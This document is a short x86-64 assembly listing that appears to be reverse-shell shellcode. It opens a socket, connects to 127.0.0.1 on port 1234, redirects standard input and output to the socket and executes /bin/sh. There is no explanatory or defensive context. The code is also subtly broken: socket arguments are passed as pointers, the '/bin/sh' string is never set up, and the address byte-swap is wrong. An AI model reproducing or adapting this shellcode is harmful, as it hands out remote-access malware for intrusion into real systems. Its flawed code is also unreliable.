section .text
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rax, rax
    mov al, 0x29
    cdq
    push rdx
    push 0x2
    mov rdi, rsp
    push 0x1
    mov rsi, rsp
    syscall

    ; connect(sock, struct sockaddr, addrlen)
    xchg rdi, rax
    xor rax, rax
    mov al, 0x2a
    mov rcx, 0x0100007f  ; 127.0.0.1 (localhost)
    bswap rcx
    push rcx
    push word 0xd204     ; port 1234
    push word 0x2
    mov rsi, rsp
    mov dl, 0x10
    syscall

    ; dup2(sock, 0)
    xor rax, rax
    mov al, 0x21
    xor rsi, rsi
    syscall

    ; dup2(sock, 1)
    xor rax, rax
    mov al, 0x21
    mov sil, 0x1
    syscall

    ; dup2(sock, 2)
    xor rax, rax
    mov al, 0x21
    mov sil, 0x2
    syscall

    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi
    mov rdx, rsi
    mov rdi, rsp
    mov al, 0x3b
    syscall

    ; exit(0)
    xor rdi, rdi
    mov rax, 0x3c
    syscall
